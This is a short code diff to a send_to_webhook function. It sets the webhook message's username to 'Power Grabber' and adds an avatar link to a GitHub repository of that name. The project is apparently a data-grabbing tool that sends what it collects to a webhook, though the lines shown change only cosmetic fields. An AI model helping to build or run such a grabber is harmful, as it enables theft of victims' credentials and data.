@@ -22,7 +22,9 @@ def send_to_webhook(content):
         }
     }
     payload = {
-        "embeds": [embed]
+        "embeds": [embed],
+        "username": "Power Grabber",
+        "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
     }
     headers = {
         "Content-Type": "application/json"
